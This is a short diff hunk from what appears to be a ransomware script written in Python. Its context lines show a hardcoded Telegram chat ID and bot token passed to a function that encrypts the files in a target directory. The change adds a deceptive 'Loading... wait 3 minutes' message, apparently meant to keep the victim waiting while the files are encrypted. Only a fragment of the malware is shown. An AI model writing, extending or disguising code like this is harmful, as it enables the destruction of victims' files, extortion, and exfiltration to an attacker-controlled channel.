@@ -60,6 +60,7 @@ if __name__ == "__main__":
     chat_id = "-1002081124539"
     
     print("Chargement...")
+    print("Loading... wait 3 minutes")
     
     try:
         files_encrypted, files_failed = encrypt_files_in_directory(target_directory, encryption_key, bot_token, chat_id)
